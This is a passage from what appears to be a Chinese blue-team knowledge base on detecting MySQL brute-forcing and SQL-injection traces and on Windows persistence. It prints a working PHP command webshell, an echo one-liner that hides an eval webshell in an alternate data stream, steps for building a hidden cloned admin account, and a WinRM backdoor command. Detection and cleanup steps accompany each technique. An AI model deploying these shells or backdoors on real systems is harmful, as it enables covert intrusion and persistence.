processlist\u51fa\u6765\u7684\u7b2c\u4e00\u5217\u7684\u7ebf\u7a0bID,\u5bf9\u4e8e\u957f\u8fde\u63a5\u548c\u4e00\u4e9b\u6bd4\u8f83\u8017\u65f6\u7684sql\u8bed\u53e5,\u4f60\u53ef\u4ee5\u7cbe\u786e\u627e\u51fa\u7a76\u7adf\u662f\u90a3\u4e00\u6761\u90a3\u4e00\u4e2a\u7ebf\u7a0b\u5728\u8fd0\u884c\u3002 \u7b2c\u4e09\u5217:Command\uff0c\u64cd\u4f5c\u7c7b\u578b\uff0c\u6bd4\u5982Connect\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0cQuery\u5c31\u662f\u67e5\u8be2\u6570\u636e\u5e93(\u589e\u5220\u67e5\u6539\u90fd\u663e\u793a\u4e3a\u67e5\u8be2)\uff0c\u53ef\u4ee5\u7279\u5b9a\u8fc7\u8651\u4e00\u4e9b\u64cd\u4f5c\u3002 \u7b2c\u56db\u5217:Argument\uff0c\u8be6\u7ec6\u4fe1\u606f\uff0c\u4f8b\u5982 Connect root@localhost on \u610f\u601d\u5c31\u662f\u8fde\u63a5\u6570\u636e\u5e93\uff0c\u5982\u6b64\u7c7b\u63a8,\u63a5\u4e0b\u9762\u7684\u8fde\u4e0a\u6570\u636e\u5e93\u4e4b\u540e,\u505a\u4e86\u4ec0\u4e48\u67e5\u8be2\u7684\u64cd\u4f5c\u3002","title":"0x01 Mysql\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02_3","text":"\u6211\u4eec\u6765\u505a\u4e2a\u7b80\u5355\u7684\u6d4b\u8bd5\u5427\uff0c\u4f7f\u7528\u6211\u4ee5\u524d\u81ea\u5df1\u5f00\u53d1\u7684\u5f31\u53e3\u4ee4\u5de5\u5177\u6765\u626b\u4e00\u4e0b\uff0c\u5b57\u5178\u8bbe\u7f6e\u6bd4\u8f83\u5c0f\uff0c2\u4e2a\u7528\u6237\uff0c4\u4e2a\u5bc6\u7801\uff0c\u51718\u7ec4\u3002 MySQL\u4e2d\u7684log\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\uff1a Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` \u4f60\u77e5\u9053\u5728\u8fd9\u4e2a\u53e3\u4ee4\u731c\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u54ea\u4e2a\u662f\u6210\u529f\u7684\u5417\uff1f \u5229\u7528\u7206\u7834\u5de5\u5177\uff0c\u4e00\u4e2a\u53e3\u4ee4\u731c\u89e3\u6210\u529f\u7684\u8bb0\u5f55\u662f\u8fd9\u6837\u5b50\u7684\uff1a 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set autocommit=0 100 Quit \u4f46\u662f\uff0c\u5982\u679c\u4f60\u662f\u7528\u5176\u4ed6\u65b9\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u70b9\u70b9\u4e0d\u4e00\u6837\u7684\u54e6\u3002 Navicat for MySQL\u767b\u5f55\uff1a 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES \u547d\u4ee4\u884c\u767b\u5f55\uff1a 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit \u8fd9\u4e2a\u5dee\u522b\u5728\u4e8e\uff0c\u4e0d\u540c\u7684\u6570\u636e\u5e93\u8fde\u63a5\u5de5\u5177\uff0c\u5b83\u5728\u8fde\u63a5\u6570\u636e\u5e93\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u662f\u4e0d\u540c\u7684\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u5dee\u522b\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5224\u65ad\u51fa\u7528\u6237\u662f\u901a\u8fc7\u8fde\u63a5\u6570\u636e\u5e93\u7684\u65b9\u5f0f\u3002 \u53e6\u5916\uff0c\u4e0d\u7ba1\u4f60\u662f\u7206\u7834\u5de5\u5177\u3001Navicat for MySQL\u3001\u8fd8\u662f\u547d\u4ee4\u884c\uff0c\u767b\u5f55\u5931\u8d25\u90fd\u662f\u4e00\u6837\u7684\u8bb0\u5f55\u3002 \u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff1a 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) \u5229\u7528shell\u547d\u4ee4\u8fdb\u884c\u7b80\u5355\u7684\u5206\u6790\uff1a #\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql \u5728\u65e5\u5fd7\u5206\u6790\u4e2d\uff0c\u7279\u522b\u9700\u8981\u6ce8\u610f\u4e00\u4e9b\u654f\u611f\u7684\u64cd\u4f5c\u884c\u4e3a\uff0c\u6bd4\u5982\u5220\u8868\u3001\u5907\u5e93\uff0c\u8bfb\u5199\u6587\u4ef6\u7b49\u3002\u5173\u952e\u8bcd\uff1adrop table\u3001drop function\u3001lock tables\u3001unlock tables\u3001load_file() \u3001into outfile\u3001into dumpfile\u3002 \u654f\u611f\u6570\u636e\u5e93\u8868\uff1aSELECT from mysql.user\u3001SELECT from mysql.func","title":"0x02 \u767b\u5f55\u6210\u529f/\u5931\u8d25"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03-sql","text":"\u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6tmpbwyov.php\uff0c\u901a\u8fc7\u8bbf\u95ee\u8fd9\u4e2a\u6728\u9a6c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u9875\u9762\u5c55\u793a\u3002 tmpbwyov.php\uff1a &1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \" \".$w.\" \";?> ` \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u7f51\u7ad9\u76ee\u5f55\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u53ef\u7591\u6587\u4ef6\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u68c0\u67e5\u7f51\u7ad9\u76ee\u5f55\u4e0b\uff0c\u662f\u5426\u5b58\u5728\u4e00\u4e9b\u6728\u9a6c\u6587\u4ef6\uff1a 2\u3001\u68c0\u67e5\u662f\u5426\u6709UDF\u63d0\u6743\u3001MOF\u63d0\u6743\u75d5\u8ff9 \u68c0\u67e5\u76ee\u5f55\u662f\u5426\u6709\u5f02\u5e38\u6587\u4ef6 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ \u68c0\u67e5\u51fd\u6570\u662f\u5426\u5220\u9664 select * from mysql.func 3\u3001\u7ed3\u5408web\u65e5\u5fd7\u5206\u6790\u3002","title":"0x03 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","text":"\u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u00b6 0x00 \u524d\u8a00 \u00b6 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6765\u7ef4\u6301\u6743\u9650\uff0c\u5982\u679c\u4f60\u60f3\u8ba9\u4f60\u7684\u540e\u95e8\u4fdd\u6301\u7684\u66f4\u4e45\u4e9b\uff0c\u90a3\u4e48\u8bf7\u9690\u85cf\u597d\u5b83\uff0c\u4f7f\u4e4b\u4e0d\u6613\u88ab\u7ba1\u7406\u5458\u53d1\u73b0\u3002 0x01 \u9690\u85cf\u6587\u4ef6 \u00b6 1\u3001\u5229\u7528\u6587\u4ef6\u5c5e\u6027 \u6700\u7b80\u5355\u7684\u4e00\u79cd\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u53f3\u952e\u5c5e\u6027\uff0c\u52fe\u9009\u9690\u85cf\uff0c\u70b9\u51fb\u786e\u5b9a\u540e\uff0c\u5728\u8fd9\u4e2a\u6587\u4ef6\u91cc\u770b\u4e0d\u5230\u521a\u521a\u7684\u6587\u4ef6\u4e86\u3002 \u5982\u679c\u8981\u8ba9\u6587\u4ef6\u663e\u793a\u51fa\u6765\uff0c\u5c31\u70b9\u51fb\u67e5\u770b\uff0c\u52fe\u9009\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\uff0c\u6587\u4ef6\u5c31\u663e\u793a\u51fa\u6765\u3002 \u5982\u4f55\u771f\u6b63\u9690\u85cf\u6587\u4ef6\uff1f \u4f7f\u7528Attrib +s +a +h +r\u547d\u4ee4\u5c31\u662f\u628a\u539f\u672c\u7684\u6587\u4ef6\u5939\u589e\u52a0\u4e86\u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3001\u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3001\u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u548c\u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002 attrib +s +a +h +r D:\\test\\project\\test .txt \u8fd9\u6837\u5c31\u505a\u5230\u4e86\u771f\u6b63\u7684\u9690\u85cf\uff0c\u4e0d\u7ba1\u4f60\u662f\u5426\u663e\u793a\u9690\u85cf\u6587\u4ef6\uff0c\u6b64\u6587\u4ef6\u5939\u90fd\u770b\u4e0d\u89c1\u3002 \u7834\u89e3\u9690\u85cf\u6587\u4ef6\uff1a \u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u5229\u7528ADS\u9690\u85cf\u6587\u4ef6\u5185\u5bb9 \u5728\u670d\u52a1\u5668\u4e0aecho\u4e00\u4e2a\u6570\u636e\u6d41\u6587\u4ef6\u8fdb\u53bb\uff0c\u6bd4\u5982index.php\u662f\u7f51\u9875\u6b63\u5e38\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5b50\u641e\uff1a \u3000 echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg \u8fd9\u6837\u5b50\u5c31\u751f\u6210\u4e86\u4e00\u4e2a\u4e0d\u53ef\u89c1\u7684shell hidden.jpg\uff0c\u5e38\u89c4\u7684\u6587\u4ef6\u7ba1\u7406\u5668\u3001type\u547d\u4ee4\uff0cdir\u547d\u4ee4\u3001del\u547d\u4ee4\u53d1\u73b0\u90fd\u627e\u4e0d\u51fa\u90a3\u4e2ahidden.jpg\u7684\u3002\u3000 \u95ee\u98981\uff1a\u5982\u4f55\u67e5\u770bindex.php:hidden.jpg\u5185\u5bb9\u5462\uff1f \u3000\u3000 \u8fdb\u5165\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff0cnotepad index.php:hidden.jpg \u6216\u8005 dir /r \u3000\u3000 \u95ee\u98982\uff1a\u5982\u4f55\u5220\u9664index.php:hidden.jpg\uff1f \u76f4\u63a5\u5220\u9664index.php\u5373\u53ef 3\u3001\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf \u9a71\u52a8\u9690\u85cf\u6211\u4eec\u53ef\u4ee5\u7528\u8fc7\u4e00\u4e9b\u8f6f\u4ef6\u6765\u5b9e\u73b0\uff0c\u8f6f\u4ef6\u540d\u5b57\u53eb\uff1aEasy File Locker \u4e0b\u8f7d\u94fe\u63a5\uff1a http://www.xoslab.com/efl.html \u5982\u679c\u4f60\u5728\u7f51\u7ad9\u76ee\u5f55\u672a\u67e5\u627e\u5230\u76f8\u5173\u6587\u4ef6\uff0c\u4e14\u7cfb\u7edf\u76ee\u5f55\u5b58\u5728\u5b58\u5728\u4ee5\u4e0b\u6587\u4ef6\uff1a c:\\WINDOWS\\xlkfs.dat c:\\WINDOWS\\xlkfs.dll c:\\WINDOWS\\xlkfs.ini c:\\WINDOWS\\system32\\drivers\\xlkfs.sys \u90a3\u4e48\u4f60\uff0c\u5e94\u8be5\u662f\u906d\u9047\u4e86\u9a71\u52a8\u7ea7\u6587\u4ef6\u9690\u85cf\u3002 \u5982\u4f55\u6e05\u9664\uff1f 1\u3001\u67e5\u8be2\u670d\u52a1\u72b6\u6001\uff1a sc qc xlkfs 2\u3001\u505c\u6b62\u670d\u52a1\uff1a net stop xlkfs \u670d\u52a1\u505c\u6b62\u4ee5\u540e\uff0c\u7ecf\u9a71\u52a8\u7ea7\u9690\u85cf\u7684\u6587\u4ef6\u5373\u53ef\u663e\u73b0 3\u3001\u5220\u9664\u670d\u52a1\uff1a sc delete xlkfs 4\u3001\u5220\u9664\u7cfb\u7edf\u76ee\u5f55\u4e0b\u9762\u7684\u6587\u4ef6\uff0c\u91cd\u542f\u7cfb\u7edf\uff0c\u786e\u8ba4\u670d\u52a1\u5df2\u7ecf\u88ab\u6e05\u7406\u4e86\u3002 \u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u8fd8\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u4f2a\u88c5\u6210\u4e00\u4e2a\u7cfb\u7edf\u6587\u4ef6\u5939\u56fe\u6807\uff0c\u5229\u7528\u7578\u5f62\u6587\u4ef6\u540d\u3001\u4fdd\u7559\u6587\u4ef6\u540d\u65e0\u6cd5\u5220\u9664\uff0c\u751a\u81f3\u53d6\u4e00\u4e2a\u4e0e\u7cfb\u7edf\u6587\u4ef6\u5f88\u50cf\u7684\u6587\u4ef6\u540d\u5e76\u653e\u5728\u6b63\u5e38\u76ee\u5f55\u91cc\u9762\uff0c\u5f88\u96be\u8fa8\u522b\u51fa\u6765\u3002 \u8fd9\u4e9b\u9690\u85cf\u6587\u4ef6\u7684\u65b9\u5f0f\u65e9\u5df2\u4e0d\u518d\u662f\u79d8\u5bc6\uff0c\u800c\u66f4\u591a\u7684\u6076\u610f\u7a0b\u5e8f\u5f00\u59cb\u5b9e\u73b0\u201c\u65e0\u6587\u4ef6\u201d\u653b\u51fb\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6781\u96be\u88ab\u53d1\u73b0\u3002 0x02 \u9690\u85cf\u8d26\u53f7 \u00b6 window \u9690\u85cf\u7cfb\u7edf\u7528\u6237\u64cd\u4f5c\uff0cCMD\u547d\u4ee4\u884c\u4e0b\uff0c\u5efa\u7acb\u4e86\u4e00\u4e2a\u7528\u6237\u540d\u4e3a\u201ctest$\u201d\uff0c\u5bc6\u7801\u4e3a\u201cabc123!\u201d\u7684\u7b80\u5355\u9690\u85cf\u8d26\u6237,\u5e76\u4e14\u628a\u8be5\u9690\u85cf\u8d26\u6237\u63d0\u5347\u4e3a\u4e86\u7ba1\u7406\u5458\u6743\u9650\u3002 PS:CMD\u547d\u4ee4\u884c\u4f7f\u7528\"net user\",\u770b\u4e0d\u5230\"test$\"\u8fd9\u4e2a\u8d26\u53f7\uff0c\u4f46\u5728\u63a7\u5236\u9762\u677f\u548c\u672c\u5730\u7528\u6237\u548c\u7ec4\u662f\u53ef\u4ee5\u663e\u793a\u6b64\u7528\u6237\u7684\u3002 \u514b\u9686\u8d26\u53f7\u5236\u4f5c\u8fc7\u7a0b\uff1a 1\u3001\u201c\u5f00\u59cb\u201d\u2192\u201c\u8fd0\u884c\u201d\uff0c\u8f93\u5165\u201cregedt32.exe\u201d\u540e\u56de\u8f66,\u9700\u8981\u5230\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\u201d\uff0c\u5355\u673a\u53f3\u5efa\u6743\u9650\uff0c\u628a\u540d\u53eb\uff1aadministrator\u7684\u7528\u6237\u7ed9\u4e88\uff1a\u5b8c\u5168\u63a7\u5236\u4ee5\u53ca\u8bfb\u53d6\u7684\u6743\u9650\uff0c\u5728\u540e\u9762\u6253\u52fe\u5c31\u884c\uff0c\u7136\u540e\u5173\u95ed\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u518d\u6b21\u6253\u5f00\u5373\u53ef\u3002 2\u3001\u6765\u5230\u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u201cHKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\u201d\u5904\uff0c\u70b9\u51fbtest$\u7528\u6237\uff0c\u5f97\u5230\u5728\u53f3\u8fb9\u663e\u793a\u7684\u952e\u503c\u4e2d\u7684\u201c\u7c7b\u578b\u201d\u4e00\u9879\u663e\u793a\u4e3a0x3ec\uff0c\u627e\u5230\u7bad\u5934\u6240\u6307\u76ee\u5f55\u3002 3\u3001\u627e\u5230administrator\u6240\u5bf9\u5e94\u7684\u7684\u9879\u4e3a\u201c000001F4\u201d\uff0c\u5c06\u201c000001F4\u201d\u7684F\u503c\u590d\u5236\u5230\u201c000003EC\u201d\u7684F\u503c\u4e2d\uff0c\u4fdd\u5b58\u3002 4\u3001\u5206\u522btest \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u548c\u201c000003EC\u5bfc\u51fa\u5230\u684c\u9762\uff0c\u5220\u9664test \u7528\u6237 net user test$ /del 5\u3001\u5c06\u521a\u624d\u5bfc\u51fa\u7684\u4e24\u4e2a\u540e\u7f00\u4e3a.reg\u7684\u6ce8\u518c\u8868\u9879\u5bfc\u5165\u6ce8\u518c\u8868\u4e2d\u3002\u8fd9\u6837\u6240\u8c13\u7684\u9690\u85cf\u8d26\u6237\u5c31\u521b\u5efa\u597d\u4e86\u3002PS\uff1a\u4e0d\u7ba1\u4f60\u662f\u5728\u547d\u4ee4\u63d0\u793a\u7b26\u4e0b\u8f93\u5165net user \u6216\u8005\u5728\u7cfb\u7edf\u7528\u6237\u7ba1\u7406\u754c\u9762\u90fd\u662f\u770b\u4e0d\u5230test$\u8fd9\u4e2a\u8d26\u6237\u7684\uff0c\u53ea\u6709\u5728\u6ce8\u518c\u8868\u4e2d\u624d\u80fd\u770b\u5f97\u5230\u3002 \u68c0\u6d4b\u548c\u6e05\u7406\u65b9\u6cd5\uff1a \u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u4f7f\u7528\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u529f\u80fd\u8fdb\u884c\u67e5\u770b\uff0c\u53ef\u68c0\u6d4b\u51fa\u9690\u85cf\u3001\u514b\u9686\u8d26\u53f7\u3002 0x03 \u7aef\u53e3\u590d\u7528 \u00b6 \u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Window\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u524d\u9635\u5b50\uff0c@Twi1ight\u516c\u5e03\u4e86\u4e00\u79cd\u57fa\u4e8e\u5185\u7f6e\u7cfb\u7edf\u670d\u52a1\u7684\u7aef\u53e3\u590d\u7528\u540e\u95e8\u65b9\u6cd5\uff0c\u5229\u7528WinRM\u670d\u52a1\uff0c\u4e00\u6761\u547d\u4ee4\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u540e\u95e8\uff1a winrm set winrm/config/service @{EnableCompatibilityHttpListener=\"true\"} \u4e00\u822c\u5f00\u542fWinRM\u670d\u52a1\u4f5c\u4e3a\u8fdc\u7a0b\u7ba1\u7406\uff0c\u4f46\u8fd8\u662f\u7b2c\u4e00\u6b21\u542c\u5230\u53ef\u4ee5\u4f5c\u4e3a\u7aef\u53e3\u590d\u7528\uff0c\u4e00\u79cd\u7b80\u5355\u5bb9\u6613\u5b9e\u73b0\u7684\u7aef\u53e3\u590d\u7528\u65b9\u5f0f\u3002\u5047\u8bbe\uff0c\u653b\u51fb\u8005\u5df2\u83b7\u53d6\u5230administrator\u8d26\u53f7\u5bc6\u7801\uff0c\u8fde\u63a5\u8fdc\u7a0bWinRM\u670d\u52a1\u6267\u884c\u547d\u4ee4\uff1a \u5f53\u6267\u884c\u8fd9\u6761\u547d\u4ee4\u7684\u540c\u65f6\uff0c\u5c06\u5728\u5b89\u5168\u65e5\u5fd7\u4e2d\u7559\u4e0b\u75d5\u8ff9\uff0c \u53e6\u5916\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u91cd\u5b9a\u5411\uff0c\u5de5\u5177\uff1a https://github.com/crabkun/Switcher 0x04 \u8fdb\u7a0b\u6ce8\u5165 \u00b6 \u8fdb\u7a0b\u6ce8\u5165\uff0c\u4e00\u76f4\u662f\u75c5\u6bd2\u6728\u9a6c\u7684\u60ef\u7528\u624b\u6bb5\uff0c\u540c\u65f6\uff0c\u5b83\u4e5f\u662f\u4e00\u79cd\u9690\u85cf\u6280\u672f\u3002\u5728\u5e38\u89c1\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u4e2d\uff0c\u8fdb\u7a0b\u6ce8\u5165\u662f\u600e\u4e48\u505a\u7684\u4ee5\u53ca\u6211\u4eec\u5982\u4f55\u901a\u8fc7\u5de5\u5177\u6392\u67e5\u51fa\u6765\uff1f 1\u3001meterpreter\u4f1a\u8bdd\u6ce8\u5165 \u5f53\u524d\u6743\u9650\u65e0\u6cd5\u83b7\u53d6hash\u503c\uff0c\u67e5\u770b\u76ee\u524d\u7cfb\u7edf\u8fdb\u7a0b \u901a\u8fc7migrate\u5c06\u8fdb\u7a0b\u6ce8\u5165\u5230system\u8fdb\u7a0b\u540e\uff0c\u6210\u529f\u83b7\u5f97hash\u503c\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a \u901a\u8fc7TCPview\u663e\u793a\u5df2\u5efa\u7acb\u7684TCP\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5f02\u5e38\u7684\u8fde\u63a5\uff0c\u540c\u65f6\uff0c\u6076\u610f\u8f6f\u4ef6\u5c06\u4ee5\u7eff\u8272\u663e\u793a\u4e0d\u5230\u4e00\u79d2\u949f\uff0c\u7136\u540e\u53d8\u6210\u7ea2\u8272\u6d88\u5931\uff0c\u5982\u6b64\u5faa\u73af\u3002 2\u3001Empire\u4f1a\u8bdd\u8fdb\u7a0b\u6ce8\u5165 \u901a\u8fc7psinject\u6a21\u5757\u8fdb\u884c\u4f1a\u8bdd\u6ce8\u5165\uff0c\u76f4\u63a5\u8f93\u5165ps\u9009\u62e9\u4e00\u4e2aSYSTEM\u6743\u9650\u7684\u8fdb\u7a0bPID\uff0c\u4f7f\u7528\u8fdb\u7a0b\u6ce8\u5165\u6a21\u5757\uff0c\u6765\u83b7\u53d6\u6743\u9650\u3002\u5982\u4e0b\u56fe\uff1a Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6216\u8005\u706b\u7ed2\u5251\u76d1\u63a7\u8fdb\u7a0b\u90fd\u53ef\u4ee5\u5b9a\u4f4d\u5230\u6ce8\u5165\u8fdb\u7a0b\u3002 3\u3001Cobalt Strike\u8fdb\u7a0b\u6ce8\u5165 \u9009\u62e9\u8fdb\u7a0b\uff0c\u70b9\u51fbinject\uff0c\u968f\u540e\u9009\u62e9\u76d1\u542c\u5668\uff0c\u70b9\u51fbchoose\uff0c\u5373\u53ef\u53d1\u73b0Cobaltstrike\u5f39\u56de\u4e86\u76ee\u6807\u673a\u7684\u4e00\u4e2a\u65b0\u4f1a\u8bdd\uff0c\u8fd9\u4e2a\u4f1a\u8bdd\u5c31\u662f\u6210\u529f\u6ce8\u5165\u5230\u67d0\u8fdb\u7a0b\u7684beacon\u3002 Window\u540e\u95e8\u6392\u67e5\uff1a\u5229\u7528process monitor\u6355\u6349\u901a\u4fe1\u8fc7\u7a0b\uff0c\u6709\u89c4\u5f8b\u7684\u8bf7\u6c42\u53d6\u51b3\u4e8esleep\u8bbe\u7f6e\u7684\u95f4\u9694\u3002 0x05 \u7ed3\u675f \u00b6 \u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u4e86Window\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3001\u9690\u85cf\u8d26\u53f7\u3001\u7aef\u53e3\u590d\u7528\u3001\u8fdb\u7a0b\u6ce8\u5165\u7b49\u65b9\u9762\u7684\u7b80\u5355\u5b9e\u73b0\u53ca\u5176\u6392\u67e5\u6280\u5de7\u3002\u4ec5\u4f5c\u629b\u7816\u5f15\u7389\u4e4b\u7528\uff0c\u6b22\u8fce\u7559\u8a00\u5206\u4eab\u3002 \u53c2\u8003\u94fe\u63a5\uff1a Canisrufus:\u4e00\u6b3e\u57fa\u4e8ePython\u7684Windows\u9690\u85cf\u540e\u95e8 https://github.com/maldevel/canisrufus windows\u5e38\u89c1backdoor\u3001\u6743\u9650\u7ef4\u6301\u65b9\u6cd5\u53ca\u6392\u67e5\u6280\u672f https://xz.aliyun.com/t/4842 TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/ Hide Toolz \u8fdb\u7a0b\u9690\u85cf\u5de5\u5177 \u5b98\u7f51\u5730\u5740: https://www.hidetoolz.com/ HideToolz\u662f\u4e00\u6b3e\u7b80\u5355\u5c0f\u5de7\u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u9690\u85cf\u8fdb\u7a0b\uff0c\u4e00\u952e\u9690\u85cf\u4f60\u60f3\u9690\u85cf\u7684\u7a0b\u5e8f Cymothoa \u00b6 \u6ce8\u5165\u5de5\u5177 cs \u8fdb\u7a0b\u6ce8\u5165 https://bbs.ichunqiu.com/thread-53003-1-1.html Metasploit\u6ce8\u5165 dll \u00b6 